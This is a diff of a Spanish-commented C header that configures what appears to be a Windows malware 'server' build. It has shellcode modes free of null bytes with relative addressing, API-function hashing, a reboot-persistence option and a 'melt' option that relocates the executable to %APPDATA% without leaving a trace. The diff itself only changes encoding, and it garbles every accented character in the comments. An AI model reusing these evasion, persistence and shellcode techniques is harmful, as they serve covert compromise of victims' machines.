@@ -1,14 +1,14 @@
-/*###############################################################################
+ï»¿/*###############################################################################
 ** Macros:
 **    En este fichero de encabezado estan definidos los macros preprocesador
 **    encargados de:
 **        *Crear e introducir hashes de las funciones en el fichero binario.
 **        *Funciones para introducir BYTE/WORD/DWORD en el fichero binario.
-**        *Función encargada de generar los identificadores que situan las
+**        *Funciï¿½n encargada de generar los identificadores que situan las
 **            direcciones en el 'stack de direcciones'
-**        *Compilación condicionada encargada de generar:
+**        *Compilaciï¿½n condicionada encargada de generar:
 **            +Una shellcode libre de bytes nulos
-**            +Direcciones relativas que permitan la reubicación del código
+**            +Direcciones relativas que permitan la reubicaciï¿½n del cï¿½digo
 **            +Un gestor de errores
 **            +Posibilidad de hacer melt con el ejecutable a %APPDATA%
 *###############################################################################*/
@@ -17,14 +17,14 @@
 
 /*###############################################################################
 ** AUTOSTART:
-**    Incluye código para la persistencia tras reinicio
+**    Incluye cï¿½digo para la persistencia tras reinicio
 *###############################################################################*/
 #define AUTOSTART
 #undef AUTOSTART
 
 /*###############################################################################
 ** DEBUG:
-**    Incluye código para mostrar mensajes por consola
+**    Incluye cï¿½digo para mostrar mensajes por consola
 *###############################################################################*/
 #define DEBUG
 //#undef DEBUG
@@ -68,10 +68,10 @@ const char* sTARGET     = {"[S]Cargando siguiente TARGET(%s:%d)...\n"};
 
 /*###############################################################################
 ** MELT:
-**    Si se define la compilación MELT el código generado tendrá
-**    la capacidad de ejecutar la ejecución en %APPDATA% sin dejar rastro.
+**    Si se define la compilaciï¿½n MELT el cï¿½digo generado tendrï¿½
+**    la capacidad de ejecutar la ejecuciï¿½n en %APPDATA% sin dejar rastro.
 **    NOTA:{
-**        Se añade código, como consecuencia aumenta el tamaño
+**        Se aï¿½ade cï¿½digo, como consecuencia aumenta el tamaï¿½o
 **    }
 *###############################################################################*/
 #define MELT
@@ -79,10 +79,10 @@ const char* sTARGET     = {"[S]Cargando siguiente TARGET(%s:%d)...\n"};
 
 /*###############################################################################
 ** Error_Check:
-**    Si se define la compilación ERR_CHECK el código generado tendrá
-**    comprobación de errores.
+**    Si se define la compilaciï¿½n ERR_CHECK el cï¿½digo generado tendrï¿½
+**    comprobaciï¿½n de errores.
 **    NOTA:{
-**        Se añade código, como consecuencia aumenta el tamaño
+**        Se aï¿½ade cï¿½digo, como consecuencia aumenta el tamaï¿½o
 **    }
 *###############################################################################*/
 #define ERR_CHECK
@@ -91,28 +91,28 @@ const char* sTARGET     = {"[S]Cargando siguiente TARGET(%s:%d)...\n"};
 /*###############################################################################
 ** Control de errores:
 **    Constantes utilizadas en el control de errores.
-**    Solamente las excepciones críticas serán controladas, y
-**    se devolverá la constante de error correspondiente como
+**    Solamente las excepciones crï¿½ticas serï¿½n controladas, y
+**    se devolverï¿½ la constante de error correspondiente como
 **    'Exit Code' en ExitProcess()@kernel32
 *###############################################################################*/
-#define ERR_NO  0x0     //No ha habido ningún error. El server ha finalizado correctamente.
-#define ERR_FNC 0x1     //Ha habido un error en la funcion LoadFunctions(). Probablemente alguna función no se ha encontrado.
-//#define ERR_HST 0x2     //Ha habido un error al resolver el Hostname. Probablemente debido a un problema de conexión.
+#define ERR_NO  0x0     //No ha habido ningï¿½n error. El server ha finalizado correctamente.
+#define ERR_FNC 0x1     //Ha habido un error en la funcion LoadFunctions(). Probablemente alguna funciï¿½n no se ha encontrado.
+//#define ERR_HST 0x2     //Ha habido un error al resolver el Hostname. Probablemente debido a un problema de conexiï¿½n.
 #define ERR_MEM 0x3     //Ha habido un error al reservar memoria.
-#define ERR_SUM 0x4     //Ha habido un error en la suma de comprobación.
-#define ERR_MTX 0x5     //El server ya está en ejecución.
+#define ERR_SUM 0x4     //Ha habido un error en la suma de comprobaciï¿½n.
+#define ERR_MTX 0x5     //El server ya estï¿½ en ejecuciï¿½n.
 #define MELT_DONE 0x6   //Cerrado por MELT
 
 /*###############################################################################
 ** Shellcode:
-**    Si se define la compilación en modo 'shellcode' el código generado no tendrá
-**    bytes nulos ni direcciones estáticas.
+**    Si se define la compilaciï¿½n en modo 'shellcode' el cï¿½digo generado no tendrï¿½
+**    bytes nulos ni direcciones estï¿½ticas.
 **    Se diferencian dos modos de shellcode:
 **      [+] Direcciones relativas (SC_DELTA)
 **      [+] Bytes nulos (SC_NULL)
 **    
 **    NOTA:{
-**        Se añade código, como consecuencia aumenta el tamaño
+**        Se aï¿½ade cï¿½digo, como consecuencia aumenta el tamaï¿½o
 **    }
 *###############################################################################*/
 #define SC_DELTA
@@ -147,8 +147,8 @@ const char* sTARGET     = {"[S]Cargando siguiente TARGET(%s:%d)...\n"};
 **          for x in s:
 **              r^=(ord(x)*ord(x))
 **          return r
-**    Después de generar el hash lo introduce en el binario.
-**    El tamaño del hash es de 16 bits (1 WORD)
+**    Despuï¿½s de generar el hash lo introduce en el binario.
+**    El tamaï¿½o del hash es de 16 bits (1 WORD)
 *###############################################################################*/
 DEFINE_PYSRC(
 def HASH_AND_EMIT(s):
@@ -179,7 +179,7 @@ def EMIT_ARRAY(a):
 #define STACK_OFFSET 0x40
 /*###############################################################################
 ** API_DEFINE:
-**    Macro que genera el offset de la función en el stack de APIs y calcula su
+**    Macro que genera el offset de la funciï¿½n en el stack de APIs y calcula su
 **    hash.
 *###############################################################################*/
 /*###############################################################################
@@ -203,7 +203,7 @@ def VAR_DEFINE(name):
 
 /*###############################################################################
 ** CALC_STACKSIZE:
-**    Macro que calcula el tamaño del stack de APIs
+**    Macro que calcula el tamaï¿½o del stack de APIs
 *###############################################################################*/
 DEFINE_PYSRC(
 def STACKSIZE():
@@ -212,8 +212,8 @@ def STACKSIZE():
 
 /*###############################################################################
 ** Macros de shellcode:
-**    Conjunto de macros encargados de evitar direcciones estáticas y bytes nulos.
-**    En caso de no estar activada la compilación 'SHELLCODE' estas características
+**    Conjunto de macros encargados de evitar direcciones estï¿½ticas y bytes nulos.
+**    En caso de no estar activada la compilaciï¿½n 'SHELLCODE' estas caracterï¿½sticas
 **    quedan desactivadas.
 *###############################################################################*/
 
@@ -237,7 +237,7 @@ def STACKSIZE():
     #define DELTA __asm{add DWORD PTR[esp], edi}
     /*###############################################################################
     ** movr:
-    **    Macro que hace un mov con una dirección estática y la repara
+    **    Macro que hace un mov con una direcciï¿½n estï¿½tica y la repara
     **    TODO: COMPROBAR QUE EDI SEA EL DELTA SIEMPRE!!!
     *###############################################################################*/
     #ifdef SC_NULL
@@ -252,7 +252,7 @@ def STACKSIZE():
     #define DELTA ;
     /*###############################################################################
     ** movr:
-    **    Macro que hace un mov con una dirección estática y la repara
+    **    Macro que hace un mov con una direcciï¿½n estï¿½tica y la repara
     **    TODO: COMPROBAR QUE EDI SEA EL DELTA SIEMPRE!!!
     *###############################################################################*/
     #ifdef SC_NULL
@@ -267,7 +267,7 @@ def STACKSIZE():
 
 /*###############################################################################
 ** pushr:
-**    Macro que pushea en el stack una dirección estática y la repara
+**    Macro que pushea en el stack una direcciï¿½n estï¿½tica y la repara
 **    TODO: COMPROBAR QUE EDI SEA EL DELTA SIEMPRE!!!
 *###############################################################################*/
 #define pushr(addr)\
